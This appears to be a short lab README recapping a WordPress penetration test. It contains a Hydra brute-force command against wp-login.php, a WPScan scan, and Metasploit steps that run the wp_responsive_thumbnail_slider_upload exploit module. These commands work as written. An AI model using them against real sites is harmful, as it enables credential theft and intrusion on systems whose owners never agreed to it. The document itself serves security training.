# Pentest-WP-workflow

This workflow recaps the WP pentest using Hydra and Metasploit. 

## Lab environment
- [VMware](https://www.vmware.com/products/workstation-player.html)
- [Kali Linux](https://www.kali.org/get-kali/#kali-platforms)

## Tools 
- [Hydra](https://www.kali.org/tools/hydra/) - An open-source password cracking tool that searches usernames and passwords by brutal forcing against wordlists.
- [WPScan](https://www.kali.org/tools/wpscan/) - scan a WordPress website for any vulnerabilities. 
- [Metasploit](https://www.kali.org/tools/metasploit-framework/) - An open-source vulnerability scanner that allows users to find vulnerabilities on target machines and send payloads. 

## 1. Finding username and password
The first step is to find the credentials for the target WordPress website using Hydra. 

```
hydra -l user -P /usr/share/wordlists/rockyou.txt 00.00.00.000 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

`-l` Login

`-P` Password

`-V` Verbose mode

`/usr/share/wordlists/rockyou.txt` path to a wordlist. 

Replace 00.00.00.000 with the target IP address. 


## 2. Running vulnerability scanner using WPScan

The second step is to find vulnerabilities in a WordPress website. WPScan searched for unpatched plugins and themes. You will need API Token from [WPScan.com](https://wpscan.com/api). 

```
 wpscan --url 00.00.00.000 --api-token 000000000000000000000000000 > wpscan-results.txt
```

![Screenshot of WPscan results.](https://github.com/TerumiB/Pentest-WP-workflow/blob/main/assets/1-wpscan.png)

The results shows 3 vulnerabilities in **wp_responsive_thumbnail_slider_upload** plugin. 


## 3. Send payload using Metasploit

This step focuses on generating the payload against the target. 

1. Start Metasploit
`msfconsole`

2. Scan the WordPress

![Screenshot of Module current status.](https://github.com/TerumiB/Pentest-WP-workflow/blob/main/assets/3.jpg)


```
use auxiliary/scanner/http/wordpress_scanner
set RHOSTS 00.00.00.000
set VHOST 00.00.00.000
set WPUSERNAME user
set WPPASSWORD password
run
```

3. Find available payloads for the unsecured plugin that you discovered in the previous step. In our case, it was **wp_responsive_thumbnail_slider_upload**.

`use auxiliary/scanner/http/wordpress_scanner ` to scan WordPress vulnerabilities


![Screenshot of Module setting.](https://github.com/TerumiB/Pentest-WP-workflow/blob/main/assets/2.jpg)

```
use exploit/multi/http/wp_responsive_thumbnail_slider_upload
show targets
set TARGET 0
set RHOSTS 00.00.00.000
set VHOST 00.00.00.000
set WPUSERNAME user
set WPPASSWORD password
```

Optional

`show targets`   List available payloads

`show options` Confirm the necessary info is entered. 

4. Send the payload to the target.
   
`exploit` 


